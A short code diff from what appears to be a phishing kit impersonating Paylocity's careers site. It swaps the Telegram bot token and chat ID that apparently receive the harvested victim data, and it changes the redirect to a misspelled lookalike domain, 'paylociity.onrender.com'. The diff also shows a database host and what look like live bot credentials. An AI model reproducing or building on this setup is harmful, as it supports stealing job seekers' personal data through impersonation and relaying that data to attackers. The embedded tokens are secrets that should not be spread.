@@ -4,8 +4,8 @@ $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 db
 
 
 // Telegram configuration
-define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
-define('TELEGRAM_CHAT_ID', '1325797388');
+define('TELEGRAM_BOT_TOKEN', '6559948089:AAFPgcZujs2vLPS9Ymvhqz5HOzwaIWoUZa4');
+define('TELEGRAM_CHAT_ID', '1749633126');
 
 
 
@@ -52,7 +52,7 @@ curl_close($ch);
 
 
 
-header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/processing.html");
+header("Location:https://paylociity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/processing.html");
 
 exit; 
 }
